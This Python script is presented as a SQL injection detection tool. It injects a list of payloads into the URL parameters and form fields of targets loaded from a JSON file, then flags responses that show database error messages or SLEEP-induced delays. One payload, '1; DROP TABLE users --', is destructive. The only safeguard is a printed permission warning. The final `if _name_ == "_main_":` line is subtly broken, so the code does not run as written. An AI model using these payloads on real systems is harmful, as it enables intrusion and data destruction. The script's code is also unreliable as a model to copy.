#!/usr/bin/env python3
import requests
import re
import sys
import time
from urllib.parse import urlparse, parse_qs, urlencode
import json
from datetime import datetime

# SQL error patterns and payloads
SQL_ERRORS = [
    r"mysql_fetch", r"mysql_error", r"SQL syntax.*MySQL", r"Warning.*mysql",
    r"sqlite3", r"unrecognized token", r"ORA-[0-9]{5}", r"PostgreSQL.*ERROR",
    r"Microsoft SQL Server", r"SQLException"
]

SQL_PAYLOADS = [
    "' OR '1'='1", "1; DROP TABLE users --", "' UNION SELECT NULL --",
    "1' AND 1=1 --", "' OR 'a'='a", "1' AND SLEEP(3) --"  # Blind SQL payload
]

# Threshold for time-based blind SQL injection (seconds)
TIME_THRESHOLD = 3

def load_targets(file_path):
    """Load target URLs and parameters from a JSON file."""
    try:
        with open(file_path, 'r') as f:
            data = json.load(f)
        targets = data.get("targets", [])
        if not targets:
            print("No targets found in the file.")
            sys.exit(1)
        return targets
    except (json.JSONDecodeError, FileNotFoundError) as e:
        print(f"Error loading targets file: {e}")
        sys.exit(1)

def validate_url(url):
    """Validate URL format."""
    parsed = urlparse(url)
    return all([parsed.scheme in ['http', 'https'], parsed.netloc])

def detect_sql_error(response_text):
    """Check response for SQL error patterns."""
    for pattern in SQL_ERRORS:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    return False

def detect_time_delay(start_time, end_time):
    """Check if response time indicates blind SQL injection."""
    return (end_time - start_time) >= TIME_THRESHOLD

def check_sql_injection(url, method="GET", params=None, data=None):
    """Test a URL for SQL injection vulnerabilities."""
    results = []
    session = requests.Session()

    # Ensure params or data are provided based on method
    if method.upper() == "GET":
        if not params:
            params = {}
        original_params = params.copy()
    elif method.upper() == "POST":
        if not data:
            data = {}
        original_data = data.copy()
    else:
        print(f"Invalid method: {method}. Skipping.")
        return results

    for payload in SQL_PAYLOADS:
        print(f"\nTesting payload: {payload} on {url}")
        
        if method.upper() == "GET":
            for param in original_params.keys():
                test_params = original_params.copy()
                test_params[param] = payload
                # Handle URLs with or without existing query strings
                base_url = url.split('?')[0]
                test_url = f"{base_url}?{urlencode(test_params)}"
                try:
                    start_time = time.time()
                    response = session.get(test_url, timeout=10)
                    end_time = time.time()
                    
                    if detect_sql_error(response.text):
                        result = {
                            "method": "GET", "param": param, "payload": payload,
                            "url": test_url, "evidence": "SQL error detected"
                        }
                        results.append(result)
                        print(f" - Vulnerable GET param: {param} | URL: {test_url}")
                    elif "SLEEP" in payload.upper() and detect_time_delay(start_time, end_time):
                        result = {
                            "method": "GET", "param": param, "payload": payload,
                            "url": test_url, "evidence": f"Time delay detected ({end_time - start_time:.2f}s)"
                        }
                        results.append(result)
                        print(f" - Blind SQL vuln (GET): {param} | URL: {test_url}")
                except requests.RequestException as e:
                    print(f" - Error with GET request to {test_url}: {e}")

        elif method.upper() == "POST":
            for param in original_data.keys():
                test_data = original_data.copy()
                test_data[param] = payload
                try:
                    start_time = time.time()
                    response = session.post(url, data=test_data, timeout=10)
                    end_time = time.time()
                    
                    if detect_sql_error(response.text):
                        result = {
                            "method": "POST", "param": param, "payload": payload,
                            "data": test_data, "evidence": "SQL error detected"
                        }
                        results.append(result)
                        print(f" - Vulnerable POST param: {param} | Data: {test_data}")
                    elif "SLEEP" in payload.upper() and detect_time_delay(start_time, end_time):
                        result = {
                            "method": "POST", "param": param, "payload": payload,
                            "data": test_data, "evidence": f"Time delay detected ({end_time - start_time:.2f}s)"
                        }
                        results.append(result)
                        print(f" - Blind SQL vuln (POST): {param} | Data: {test_data}")
                except requests.RequestException as e:
                    print(f" - Error with POST request to {url}: {e}")

    return results

def save_results(results, log_file):
    """Save results to a log file."""
    try:
        with open(log_file, 'a') as f:
            for result in results:
                f.write(json.dumps(result) + "\n")
    except IOError as e:
        print(f"Error writing to log file: {e}")

def main():
    print("=== Automated SQL Injection Detection Tool ===")
    print("WARNING: Only test systems you have permission to scan.")

    # Load targets from file
    targets_file = input("Enter path to targets JSON file (e.g., targets.json): ").strip() or "targets.json"
    targets = load_targets(targets_file)

    # Log file setup
    log_file = f"sql_injection_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    print(f"Results will be logged to: {log_file}")

    all_results = []
    for target in targets:
        url = target.get("url")
        method = target.get("method", "GET").upper()
        params = target.get("params", {})
        
        if not validate_url(url):
            print(f"Skipping invalid URL: {url}")
            continue
        
        # Parse query string if present in URL for GET requests
        if method == "GET" and '?' in url:
            query = urlparse(url).query
            params.update(parse_qs(query))
        
        print(f"\nScanning: {url} | Method: {method} | Params: {params}")
        results = check_sql_injection(
            url,
            method,
            params if method == "GET" else None,
            params if method == "POST" else None
        )
        all_results.extend(results)
        save_results(results, log_file)

    # Summary
    print("\n=== Scan Summary ===")
    if all_results:
        print(f"Found {len(all_results)} potential vulnerabilities:")
        for result in all_results:
            print(f"- Method: {result['method']}")
            print(f"  Parameter: {result['param']}")
            print(f"  Payload: {result['payload']}")
            print(f"  Evidence: {result['evidence']}")
            if result['method'] == "GET":
                print(f"  URL: {result['url']}")
            else:
                print(f"  Data: {result['data']}")
            print("---")
    else:
        print("No SQL injection vulnerabilities detected.")
    print(f"Full results logged to: {log_file}")

if _name_ == "_main_":
    main()
